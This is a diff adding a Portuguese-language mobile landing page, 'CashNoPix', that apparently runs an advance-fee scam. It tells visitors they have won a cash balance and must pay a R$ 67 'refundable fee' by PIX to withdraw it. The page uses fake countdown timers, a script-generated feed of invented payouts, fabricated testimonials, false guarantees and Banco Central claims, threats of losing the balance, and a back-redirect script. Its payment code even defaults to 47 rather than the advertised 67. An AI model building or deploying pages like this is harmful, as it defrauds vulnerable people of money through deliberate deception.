@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#ef4444">
+  <title>CashNoPix - Liberar Saque</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="stylesheet" href="style.css">
+  <script src="pixel.js"></script>
+</head>
+
+<body class="taxa-page">
+
+  <!-- ① Sticky red urgency bar -->
+  <div class="alert-bar">
+    <span>⏱</span>
+    🔥 ÚLTIMOS MINUTOS! Seu saque expira em:&nbsp;<strong id="alertTimer">9:51</strong>
+  </div>
+  <vturb-smartplayer id="vid-69e18162f11e94b651081061"
+    style="display: block; margin: 0 auto; width: 100%; "></vturb-smartplayer>
+  <script
+    type="text/javascript"> var s = document.createElement("script"); s.src = "https://scripts.converteai.net/9c10e7d2-9dcb-4433-995d-9eceac2bdf37/players/69e18162f11e94b651081061/v4/player.js", s.async = !0, document.head.appendChild(s); </script>
+  <video id="mainVideo" class="inline-video" controls playsinline preload="none">
+    <!-- <source src="seu-video.mp4" type="video/mp4"> -->
+  </video>
+  </div>
+
+  <!-- ③ Parabéns + saldo -->
+  <div class="taxa-section">
+    <div class="parabens-box">
+      <div class="par-label">🎉 PARABÉNS! VOCÊ CONQUISTOU</div>
+      <div class="par-amount">
+        <span>💰</span>
+        <span id="parAmt">R$ 0,00</span>
+        <span>💰</span>
+      </div>
+      <p class="par-sub">Última etapa para receber seu dinheiro</p>
+    </div>
+  </div>
+
+  <div class="taxa-divider"></div>
+
+  <!-- ④ Não paga nada -->
+  <div class="taxa-section">
+    <div class="nopay-box">
+      <div style="flex-shrink:0;margin-top:2px;">
+        <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2.5">
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" />
+          <polyline points="22 4 12 14.01 9 11.01" />
+        </svg>
+      </div>
+      <div>
+        <div class="nopay-title">✅ VOCÊ NÃO PAGA NADA!</div>
+        <div class="nopay-desc">Os R$ 67,00 voltam 100% para sua conta em até 2 horas junto com seus ganhos</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="taxa-divider"></div>
+
+  <!-- ⑤ Como funciona -->
+  <div class="taxa-section">
+    <div class="how-title">📊 Como Funciona:</div>
+
+    <div class="step-item">
+      <div class="step-num">1</div>
+      <div class="step-lbl">Você paga</div>
+      <div class="step-val">R$ 67,00</div>
+      <div class="step-small">(Taxa temporária)</div>
+    </div>
+
+    <div class="step-arrow">↓</div>
+
+    <div class="step-item yellow">
+      <div class="step-num">2</div>
+      <div class="step-lbl">Validamos</div>
+      <div class="step-val">Sua conta</div>
+      <div class="step-small">(Automático - 2h)</div>
+    </div>
+
+    <div class="step-arrow">↓</div>
+
+    <div class="step-item green">
+      <div class="step-num">3</div>
+      <div class="step-lbl">Você recebe</div>
+      <div class="step-val" id="step3Amt">R$ 0,00</div>
+      <div class="step-small">(Seu saque + taxa de volta)</div>
+    </div>
+  </div>
+
+  <div class="taxa-divider"></div>
+
+  <!-- ⑥ Por que a taxa -->
+  <div class="taxa-section">
+    <div class="why-box">
+      <div class="why-title">🔍 Por que precisamos da taxa?</div>
+      <div class="why-desc">
+        Para garantir a <strong>segurança da sua conta</strong> e <strong>evitar fraudes</strong>,
+        precisamos validar sua identidade com uma taxa temporária de R$ 67,00.
+        <strong>Você recebe 100% de volta em até 2 horas!</strong>
+      </div>
+      <div class="live-line">🔥&nbsp;<strong>55 pessoas</strong> liberaram o saque nas últimas 24h</div>
+      <div class="live-line" id="liveFeedEl">
+        🔥&nbsp;<span>João S. acabou de receber R$ 534,38 (há 2 min)</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="taxa-divider"></div>
+
+  <!-- ⑦ Bônus especial (purple) -->
+  <div class="taxa-section">
+    <div class="bonus-purple">
+      <div class="bp-title">💰 BÔNUS ESPECIAL! 💰</div>
+      <div class="bp-sub">Pague nos próximos 5 minutos e ganhe:</div>
+      <div class="bp-amount">+ R$ 50,00</div>
+      <div class="bp-desc">de bônus extra no seu saque</div>
+      <div class="bp-total">
+        <div class="bp-total-label">Saque final:</div>
+        <div class="bp-total-value" id="bpTotal">R$ 0,00</div>
+      </div>
+      <div class="bp-expires">⚡ Essa oferta expira em <strong><span id="bonusTimer">5:00</span></strong>!</div>
+    </div>
+  </div>
+
+  <div class="taxa-divider"></div>
+
+  <!-- ⑧ Depoimentos -->
+  <div class="taxa-section">
+    <div class="sec-heading">🔥 Veja quem acabou de receber:</div>
+
+    <div class="tcard">
+      <div class="tcard-top">
+        <div class="tcard-av">
+          <img src="https://i.pravatar.cc/40?img=11" alt="" onerror="this.parentElement.textContent='👨'">
+        </div>
+        <div>
+          <div class="tcard-name">Roberto Santos</div>
+          <div class="tcard-actions">Responder · Curtir · Seguir</div>
+        </div>
+      </div>
+      <div class="tcard-body">Obrigado! Recebi certinho os R$500, vai me ajudar muito na casa 🙏</div>
+      <div class="tcard-time">3 min</div>
+    </div>
+
+    <div class="tcard">
+      <div class="tcard-top">
+        <div class="tcard-av">
+          <img src="https://i.pravatar.cc/40?img=5" alt="" onerror="this.parentElement.textContent='👩'">
+        </div>
+        <div>
+          <div class="tcard-name">Rosana de Oliveira</div>
+          <div class="tcard-actions">Responder · Curtir · Seguir</div>
+        </div>
+      </div>
+      <div class="tcard-body">Pensei que seria golpe, mas que bom que não é. fiz o pagamento da taxa e caiu por aqui.
+      </div>
+      <div class="tcard-time">6 min</div>
+    </div>
+
+    <div class="tcard">
+      <div class="tcard-top">
+        <div class="tcard-av">
+          <img src="https://i.pravatar.cc/40?img=24" alt="" onerror="this.parentElement.textContent='👩‍🦱'">
+        </div>
+        <div>
+          <div class="tcard-name">Silvana Freitas</div>
+          <div class="tcard-actions">Responder · Curtir · Seguir</div>
+        </div>
+      </div>
+      <div class="tcard-body">Sério? Estava desconfiada, mas vou tentar aqui...</div>
+      <div class="tcard-time">12 min</div>
+    </div>
+
+    <div class="tcard">
+      <div class="tcard-top">
+        <div class="tcard-av">
+          <img src="https://i.pravatar.cc/40?img=33" alt="" onerror="this.parentElement.textContent='👨‍🦳'">
+        </div>
+        <div>
+          <div class="tcard-name">Ulisses Soares</div>
+          <div class="tcard-actions">Responder · Curtir · Seguir</div>
+        </div>
+      </div>
+      <div class="tcard-body">Pode confiar, testei aqui e funcionou, já to usando a 1 semana</div>
+      <div class="tcard-time">12 min</div>
+    </div>
+
+    <div class="tcard">
+      <div class="tcard-top">
+        <div class="tcard-av">
+          <img src="https://i.pravatar.cc/40?img=47" alt="" onerror="this.parentElement.textContent='👩‍🦰'">
+        </div>
+        <div>
+          <div class="tcard-name">Bruna Fernanda</div>
+          <div class="tcard-actions">Responder · Curtir · Seguir</div>
+        </div>
+      </div>
+      <div class="tcard-body">Acabou de cair aqui na minha conta, obrigada 🙏</div>
+      <div class="tcard-time">17 min</div>
+    </div>
+
+    <div class="tcard">
+      <div class="tcard-top">
+        <div class="tcard-av">
+          <img src="https://i.pravatar.cc/40?img=32" alt="" onerror="this.parentElement.textContent='🧑🏾'">
+        </div>
+        <div>
+          <div class="tcard-name">Sophia Andrade</div>
+          <div class="tcard-actions">Responder · Curtir · Seguir</div>
+        </div>
+      </div>
+      <div class="tcard-body">Foi bem rápido até, muito obrigada, vim do Kuvv ❤</div>
+      <div class="tcard-time">22 min</div>
+    </div>
+  </div>
+
+  <div class="taxa-divider"></div>
+
+  <!-- ⑨ Garantia -->
+  <div class="taxa-section">
+    <div class="guarantee-card">
+      <span class="gar-icon">🛡️</span>
+      <div class="gar-title">🛡️ GARANTIA BLINDADA</div>
+      <div class="gar-sub">Se você NÃO receber em 2 horas:</div>
+      <div class="gar-item">✅ Taxa devolvida 2x (R$ 134,00)</div>
+      <div class="gar-item">✅ Saldo mantido (R$ <span id="garBal">0,00</span>)</div>
+      <div class="gar-item">✅ Sem burocracia, automático</div>
+      <div class="gar-note">Você não corre com NENHUM risco! Pode confiar!</div>
+    </div>
+  </div>
+
+  <div class="taxa-divider"></div>
+
+  <!-- ⑩ FAQ -->
+  <div class="taxa-section">
+    <div class="faq-item">
+      <button class="faq-btn" onclick="toggleFaq(this)">
+        ❓ Por que preciso pagar uma taxa?
+        <span class="faq-ico">+</span>
+      </button>
+      <div class="faq-ans">A taxa de R$ 67,00 é temporária e serve para validar sua identidade e evitar fraudes. Ela é
+        devolvida 100% junto com seu saque em até 2 horas.</div>
+    </div>
+    <div class="faq-item">
+      <button class="faq-btn" onclick="toggleFaq(this)">
+        ⏰ Quanto tempo para receber?
+        <span class="faq-ico">+</span>
+      </button>
+      <div class="faq-ans">Após confirmar o pagamento, você receberá seu saque em até 2 horas. A maioria das
+        transferências ocorre em menos de 30 minutos!</div>
+    </div>
+    <div class="faq-item">
+      <button class="faq-btn" onclick="toggleFaq(this)">
+        🔒 É seguro?
+        <span class="faq-ico">+</span>
+      </button>
+      <div class="faq-ans">Sim! Todos os seus dados são criptografados com SSL 256 bits. Temos mais de 50.000 pessoas
+        que já receberam com total segurança.</div>
+    </div>
+    <div class="faq-item">
+      <button class="faq-btn" onclick="toggleFaq(this)">
+        😰 E se eu não pagar?
+        <span class="faq-ico">+</span>
+      </button>
+      <div class="faq-ans">Seu saldo acumulado será cancelado automaticamente e as vagas serão liberadas para outros
+        usuários. Não perca essa oportunidade exclusiva!</div>
+    </div>
+  </div>
+
+  <!-- Space for sticky bar -->
+  <div style="height:88px;"></div>
+
+  <!-- ⑪ Sticky CTA bar -->
+  <div class="cta-sticky">
+    <button class="cta-btn" id="ctaBtn" onclick="abrirPix()">
+      💰 LIBERAR MEU SAQUE DE&nbsp;<span id="ctaAmt">R$ 0,00</span>&nbsp;✨
+    </button>
+    <div class="cta-meta">
+      🔒 Pagamento 100% Seguro e Criptografado
+      &bull; 🏦 Banco Central
+      &bull; ⭐ 4,8/5
+    </div>
+  </div>
+
+  <!-- ⑫ PIX Modal (bottom sheet on mobile) -->
+  <div class="pix-overlay" id="pixOverlay" style="display:none;" role="dialog" aria-modal="true"
+    aria-label="Pagar via PIX">
+    <div class="pix-card" id="pixCard">
+      <div class="pix-handle"></div>
+      <button class="pix-close" onclick="fecharPix()" aria-label="Fechar">✕</button>
+
+      <div class="pix-card">
+        <div class="pix-icon">⚡</div>
+        <div class="pix-title">Aguardando Pagamento</div>
+        <div class="pix-timer">Expira em: <span id="timer">15:00</span></div>
+        <div class="pix-desc">
+          Para liberar o saque de <strong>R$ 467,83</strong>, finalize o pagamento da taxa de caução.
+        </div>
+      </div>
+
+      <div class="pix-code-box">
+        <div id="qrCodeContainer" style="display:none; text-align:center; margin-bottom:15px;">
+           <img id="pixQrImg" src="" style="width:200px; height:200px; display:inline-block; border-radius:12px; border: 1px solid var(--slate-200); padding: 5px; background: #fff;">
+        </div>
+        
+        <div class="pix-code-label">Chave PIX — Copia e Cola:</div>
+        <div class="pix-code-value" id="pixCode">Gerando seu PIX...</div>
+        <button class="btn-copy" id="copyBtn" onclick="copiarPix()">
+          📋 Copiar Chave PIX
+        </button>
+      </div>
+
+      <div class="pix-how">
+        <p style="font-size:13px;font-weight:700;color:#065f46;margin-bottom:7px;">Como pagar:</p>
+        <p style="font-size:13px;color:#475569;line-height:1.85;">
+          1. Abra seu banco ou carteira digital<br>
+          2. Selecione <strong>PIX Copia e Cola</strong><br>
+          3. Cole a chave copiada<br>
+          4. Confirme o valor de <strong>R$ 67,00</strong>
+        </p>
+      </div>
+
+      <div class="pix-live">
+        <div class="live-dot"></div>
+        <span style="font-size:13px;color:#16a34a;font-weight:600;">Validando pagamento em tempo real</span>
+      </div>
+
+      <p style="font-size:11px;color:#94a3b8;text-align:center;margin-top:10px;">
+        🔒 SSL Seguro &nbsp;·&nbsp; 🏦 Banco Central &nbsp;·&nbsp; ⭐ 4,8/5
+      </p>
+    </div>
+  </div>
+
+  <script src="sounds.js"></script>
+  <script src="backredirect.js"></script>
+  <script src="pay.js"></script>
+  <script>
+    /* ============== STATE ============== */
+    const state = JSON.parse(localStorage.getItem('cnp') || '{}');
+    const bal = state.balance ?? 467.83;
+    const fmtBrl = n => 'R$ ' + n.toFixed(2).replace('.', ',');
+
+    // Populate all amount placeholders
+    document.getElementById('parAmt').textContent = fmtBrl(bal);
+    document.getElementById('ctaAmt').textContent = fmtBrl(bal);
+    document.getElementById('garBal').textContent = bal.toFixed(2).replace('.', ',');
+    document.getElementById('bpTotal').textContent = fmtBrl(bal + 50);
+    document.getElementById('step3Amt').textContent = fmtBrl(bal + 67);
+
+    /* ============== TIMERS ============== */
+    // Alert bar countdown (random 8–12 min)
+    let alertSecs = 591;
+    setInterval(() => {
+      if (alertSecs > 0) alertSecs--;
+      const m = Math.floor(alertSecs / 60), s = alertSecs % 60;
+      document.getElementById('alertTimer').textContent = m + ':' + String(s).padStart(2, '0');
+    }, 1000);
+
+    // Bonus 5-min countdown
+    let bonusSecs = 300;
+    const bInt = setInterval(() => {
+      if (bonusSecs <= 0) { clearInterval(bInt); return; }
+      bonusSecs--;
+      const m = Math.floor(bonusSecs / 60), s = bonusSecs % 60;
+      document.getElementById('bonusTimer').textContent = m + ':' + String(s).padStart(2, '0');
+    }, 1000);
+
+    /* ============== LIVE FEED ============== */
+    const feedNames = ['João S.', 'Maria C.', 'Pedro L.', 'Ana P.', 'Carlos M.', 'Fernanda R.', 'Marcos T.', 'Débora F.'];
+    setInterval(() => {
+      const n = feedNames[Math.floor(Math.random() * feedNames.length)];
+      const a = (400 + Math.random() * 200).toFixed(2).replace('.', ',');
+      const m = 1 + Math.floor(Math.random() * 6);
+      document.getElementById('liveFeedEl').innerHTML =
+        `🔥&nbsp;<span>${n} acabou de receber R$ ${a} (há ${m} min)</span>`;
+    }, 6500);
+
+    /* ============== VIDEO ============== */
+    function playVideo() {
+      document.getElementById('videoHolder').style.display = 'none';
+      const vid = document.getElementById('mainVideo');
+      vid.style.display = 'block';
+      // Video source not yet set. Add Vturb/YouTube embed here when ready.
+      // vid.src = 'seu-video.mp4';
+      // vid.play();
+    }
+
+    /* ============== FAQ ============== */
+    function toggleFaq(btn) {
+      const ans = btn.nextElementSibling;
+      const ico = btn.querySelector('.faq-ico');
+      const open = ans.classList.contains('open');
+      document.querySelectorAll('.faq-ans').forEach(a => a.classList.remove('open'));
+      document.querySelectorAll('.faq-ico').forEach(i => i.classList.remove('open'));
+      if (!open) { ans.classList.add('open'); ico.classList.add('open'); }
+      SFX.tick();
+    }
+
+    /* ============== PIX MODAL ============== */
+    let pollingInterval = null;
+
+    async function abrirPix(valor = 47) {
+      const modal = document.getElementById('pixOverlay');
+      const pixCode = document.getElementById('pixCode');
+      const qrContainer = document.getElementById('qrCodeContainer');
+      const qrImg = document.getElementById('pixQrImg');
+
+      modal.style.display = 'flex';
+      document.body.style.overflow = 'hidden';
+      pixCode.innerText = 'Gerando seu PIX...';
+      qrContainer.style.display = 'none';
+
+      try {
+        const data = await PAY.createPix(valor);
+        
+        // Atualiza Copia e Cola
+        pixCode.innerText = data.copy_paste;
+        
+        // Atualiza QR Code
+        if (data.qrcode) {
+          qrImg.src = data.qrcode;
+          qrContainer.style.display = 'block';
+        }
+        
+        startTimer(900);
+        startPolling(data.id);
+      } catch (err) {
+        pixCode.innerText = 'Erro ao gerar PIX. Tente novamente.';
+        console.error(err);
+      }
+    }
+
+    function startTimer(duration) {
+      let timer = duration, minutes, seconds;
+      const display = document.getElementById('timer');
+      const interval = setInterval(() => {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+        display.textContent = minutes + ":" + seconds;
+        if (--timer < 0) clearInterval(interval);
+      }, 1000);
+    }
+
+    function startPolling(id) {
+      if (pollingInterval) clearInterval(pollingInterval);
+      pollingInterval = setInterval(async () => {
+        const status = await PAY.checkStatus(id);
+        if (status === 'paid' || status === 'approved' || status === 'completed') {
+          clearInterval(pollingInterval);
+          PAY.trackPixel('Purchase', { value: 67.00, currency: 'BRL' });
+          SFX.success();
+          setTimeout(() => {
+            window.location.href = 'sucesso.html';
+          }, 1000);
+        }
+      }, 5000);
+    }
+
+    function fecharPix() {
+      document.getElementById('pixOverlay').style.display = 'none';
+      document.body.style.overflow = '';
+      if (pollingInterval) clearInterval(pollingInterval);
+    }
+
+    // Close on backdrop tap
+    document.getElementById('pixOverlay').addEventListener('click', e => {
+      if (e.target === document.getElementById('pixOverlay')) fecharPix();
+    });
+
+    // Swipe-down to close (mobile gesture)
+    let touchStartY = 0;
+    const card = document.getElementById('pixCard');
+    card.addEventListener('touchstart', e => { touchStartY = e.changedTouches[0].clientY; }, { passive: true });
+    card.addEventListener('touchend', e => {
+      if (e.changedTouches[0].clientY - touchStartY > 60) fecharPix();
+    }, { passive: true });
+
+    /* ============== COPY PIX ============== */
+    function copiarPix() {
+      const code = document.getElementById('pixCode').textContent.trim();
+      const btn = document.getElementById('copyBtn');
+
+      function onCopied() {
+        btn.textContent = '✅ Copiado com sucesso!';
+        btn.classList.add('copied');
+        SFX.copied();
+        setTimeout(() => {
+          btn.textContent = '📋 Copiar Chave PIX';
+          btn.classList.remove('copied');
+        }, 3000);
+      }
+
+      if (navigator.clipboard && window.isSecureContext) {
+        navigator.clipboard.writeText(code).then(onCopied).catch(() => legacyCopy(code, onCopied));
+      } else {
+        legacyCopy(code, onCopied);
+      }
+    }
+
+    function legacyCopy(text, cb) {
+      const ta = document.createElement('textarea');
+      ta.value = text;
+      Object.assign(ta.style, { position: 'fixed', left: '-9999px', top: '-9999px', opacity: '0' });
+      document.body.appendChild(ta);
+      ta.focus(); ta.select();
+      try { document.execCommand('copy'); cb(); } catch (_) { }
+      document.body.removeChild(ta);
+    }
+  </script>
+</body>
+
+</html>
